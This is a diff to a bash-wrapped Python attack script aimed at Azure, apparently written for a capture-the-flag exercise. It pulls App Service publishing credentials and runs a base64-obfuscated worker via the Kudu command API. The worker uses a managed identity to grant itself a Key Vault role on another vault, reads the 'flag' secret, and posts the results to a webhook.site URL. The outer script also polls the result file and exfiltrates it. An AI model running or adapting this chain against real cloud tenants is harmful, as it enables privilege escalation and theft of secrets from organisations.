@@ -1,4 +1,5 @@
 #!/usr/bin/env bash
+set +e
 python3 - <<'PY'
 import base64
 import json
@@ -14,9 +15,10 @@ RG = "rg-tbl-reporting-prod-eus"
 APP = "app-tbl-reporting-prod"
 KV1 = "https://kv-tbl-prod-x3euoz.vault.azure.net"
 EXF = "https://webhook.site/3ca7efc1-f17e-42c2-a7d6-41ec7a352fe4"
+VFS_RESULT = "https://" + APP + ".scm.azurewebsites.net/api/vfs/site/wwwroot/ctf_flag_result"
 
-def read_json(req):
-    return json.loads(urllib.request.urlopen(req, timeout=35).read().decode())
+def read_json(req, timeout=35):
+    return json.loads(urllib.request.urlopen(req, timeout=timeout).read().decode())
 
 def get_json(url, token):
     return read_json(urllib.request.Request(url, headers={"Authorization": "Bearer " + token}))
@@ -55,49 +57,87 @@ pub = read_json(urllib.request.Request(
     data=b"{}", method="POST", headers={"Authorization": "Bearer " + arm, "Content-Type": "application/json"}))
 ku = pub["properties"]["publishingUserName"]
 kp = pub["properties"]["publishingPassword"]
+auth = base64.b64encode((ku + ":" + kp).encode()).decode()
 
-worker = r"""import base64, json, os, time, urllib.parse, urllib.request, uuid
+worker = r'''import base64, json, os, time, urllib.parse, urllib.request, traceback, uuid
 IE = os.environ.get("IDENTITY_ENDPOINT", "")
 IH = os.environ.get("IDENTITY_HEADER", "")
 MIRES = "/subscriptions/c5e4e004-b42d-4ac4-a502-5fd338380eb6/resourceGroups/rg-tbl-reporting-prod-eus/providers/Microsoft.ManagedIdentity/userAssignedIdentities/id-tbl-reporting-writer"
+HOOK = "https://webhook.site/3ca7efc1-f17e-42c2-a7d6-41ec7a352fe4"
+OUT = "/home/site/wwwroot/ctf_flag_result"
+def emit(obj):
+    try:
+        raw = json.dumps(obj, default=str).encode()
+        urllib.request.urlopen(urllib.request.Request(HOOK, data=raw, method="POST", headers={"Content-Type":"application/json"}), timeout=8).read()
+    except Exception:
+        pass
+def save(obj):
+    try:
+        open(OUT, "w").write(json.dumps(obj, default=str))
+    except Exception:
+        pass
 def token(resource):
     q = IE + "?resource=" + urllib.parse.quote(resource) + "&api-version=2019-08-01&mi_res_id=" + urllib.parse.quote(MIRES)
     req = urllib.request.Request(q, headers={"X-IDENTITY-HEADER": IH})
     return json.loads(urllib.request.urlopen(req, timeout=25).read().decode())["access_token"]
 def oid(jwt):
-    part = jwt.split(".")[1]
-    part += "=" * (-len(part) % 4)
-    return json.loads(base64.urlsafe_b64decode(part)).get("oid")
-vt = token("https://vault.azure.net")
-at = token("https://management.azure.com")
-scope = "subscriptions/c5e4e004-b42d-4ac4-a502-5fd338380eb6/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.KeyVault/vaults/kv-tbl-sec-x3euoz"
-url = "https://management.azure.com/" + scope + "/providers/Microsoft.Authorization/roleAssignments/" + str(uuid.uuid4()) + "?api-version=2022-04-01"
-body = json.dumps({"properties": {"roleDefinitionId": "/subscriptions/c5e4e004-b42d-4ac4-a502-5fd338380eb6/providers/Microsoft.Authorization/roleDefinitions/4633458b-17de-408a-b874-0445c86b69e6", "principalId": oid(vt), "principalType": "ServicePrincipal"}}).encode()
+    p = jwt.split(".")[1]
+    p += "=" * (-len(p) % 4)
+    return json.loads(base64.urlsafe_b64decode(p)).get("oid")
+emit({"stage":"worker-started","ts":time.time()})
 try:
-    req = urllib.request.Request(url, data=body, method="PUT", headers={"Authorization": "Bearer " + at, "Content-Type": "application/json"})
-    urllib.request.urlopen(req, timeout=25).read()
-except Exception:
-    pass
-time.sleep(25)
-flag_url = "https://kv-tbl-sec-x3euoz.vault.azure.net/secrets/flag?api-version=7.4"
-req = urllib.request.Request(flag_url, headers={"Authorization": "Bearer " + token("https://vault.azure.net")})
-raw = urllib.request.urlopen(req, timeout=25).read()
-print(raw.decode())
-try:
-    urllib.request.urlopen(urllib.request.Request("https://webhook.site/3ca7efc1-f17e-42c2-a7d6-41ec7a352fe4", data=raw, method="POST", headers={"Content-Type": "application/json"}), timeout=20).read()
-except Exception:
-    pass
-"""
+    vt = token("https://vault.azure.net")
+    at = token("https://management.azure.com")
+    principal = oid(vt)
+    scope = "subscriptions/c5e4e004-b42d-4ac4-a502-5fd338380eb6/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.KeyVault/vaults/kv-tbl-sec-x3euoz"
+    url = "https://management.azure.com/" + scope + "/providers/Microsoft.Authorization/roleAssignments/" + str(uuid.uuid4()) + "?api-version=2022-04-01"
+    body = json.dumps({"properties":{"roleDefinitionId":"/subscriptions/c5e4e004-b42d-4ac4-a502-5fd338380eb6/providers/Microsoft.Authorization/roleDefinitions/4633458b-17de-408a-b874-0445c86b69e6","principalId":principal,"principalType":"ServicePrincipal"}}).encode()
+    try:
+        rr = urllib.request.urlopen(urllib.request.Request(url, data=body, method="PUT", headers={"Authorization":"Bearer "+at,"Content-Type":"application/json"}), timeout=25)
+        emit({"stage":"role-assignment","status":rr.status})
+    except Exception as e:
+        emit({"stage":"role-assignment","error":repr(e)})
+    flag_url = "https://kv-tbl-sec-x3euoz.vault.azure.net/secrets/flag?api-version=7.4"
+    last = None
+    for i in range(18):
+        try:
+            req = urllib.request.Request(flag_url, headers={"Authorization":"Bearer "+token("https://vault.azure.net")})
+            raw = urllib.request.urlopen(req, timeout=25).read()
+            data = json.loads(raw.decode())
+            result = {"stage":"flag","attempt":i+1,"response":data}
+            save(result)
+            emit(result)
+            break
+        except Exception as e:
+            last = repr(e)
+            time.sleep(5)
+    else:
+        result = {"stage":"flag-error","error":last}
+        save(result)
+        emit(result)
+except Exception as e:
+    result = {"stage":"worker-error","error":repr(e),"trace":traceback.format_exc()}
+    save(result)
+    emit(result)
+'''
 encoded = base64.b64encode(worker.encode()).decode()
 command = "nohup python3 -c \"import base64;exec(base64.b64decode('" + encoded + "').decode())\" > /home/site/wwwroot/ctf_flag_result 2>&1 </dev/null &"
 body = json.dumps({"command": command, "dir": "site/wwwroot"}).encode()
-auth = base64.b64encode((ku + ":" + kp).encode()).decode()
-req = urllib.request.Request("https://" + APP + ".scm.azurewebsites.net/api/command", data=body, method="POST", headers={"Authorization": "Basic " + auth, "Content-Type": "application/json"})
+req = urllib.request.Request("https://" + APP + ".scm.azurewebsites.net/api/command", data=body, method="POST", headers={"Authorization":"Basic "+auth,"Content-Type":"application/json"})
 try:
     result = urllib.request.urlopen(req, timeout=15).read()
 except Exception as e:
     result = ("kudu launch: " + repr(e)).encode()
 print(result.decode(errors="replace"))
-# The detached worker posts the final KV2 secret directly to the authorized webhook.
-time.sleep(1)
+
+for _ in range(20):
+    try:
+        v = urllib.request.urlopen(urllib.request.Request(VFS_RESULT, headers={"Authorization":"Basic "+auth}), timeout=8).read()
+        if v and (b"worker-started" in v or b"worker-error" in v or b"flag" in v):
+            urllib.request.urlopen(urllib.request.Request(EXF, data=v, method="POST", headers={"Content-Type":"application/json"}), timeout=10).read()
+            print("VFS_RESULT=" + v.decode(errors="replace"))
+            break
+    except Exception:
+        pass
+    time.sleep(5)
 PY
